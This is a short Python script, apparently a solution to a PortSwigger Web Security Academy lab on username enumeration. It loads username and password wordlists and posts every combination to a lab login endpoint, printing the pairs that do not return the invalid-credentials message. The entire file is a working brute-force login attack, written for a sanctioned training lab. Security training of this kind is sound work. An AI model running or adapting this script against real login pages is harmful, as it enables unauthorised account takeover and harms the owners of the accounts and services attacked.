# Username enumeration via subtly different responses

import requests

fd1 = open("/home/tester13/Documents/CTF/Portswigger/Authentication/user.txt","r")
user_list=fd1.read()
fd1.close()

fd2 = open("/home/tester13/Documents/CTF/Portswigger/Authentication/pass.txt","r")
pass_list=fd2.read()
fd2.close()


user=list(user_list.split('\n'))
newuser=' '.join(user).split()
passwd=list(pass_list.split('\n'))
newpasswd=' '.join(passwd).split()


url = "https://0a8500dd033422f4c0fd285a00f70030.web-security-academy.net/login"
for i in newuser:
    for j in newpasswd:
        data={
            "username":i,
            "password":j
        }
        r = requests.post(url,data=data)
        if "Invalid username or password" not in r.text:
            print("Credentials {}:{}".format(i,j))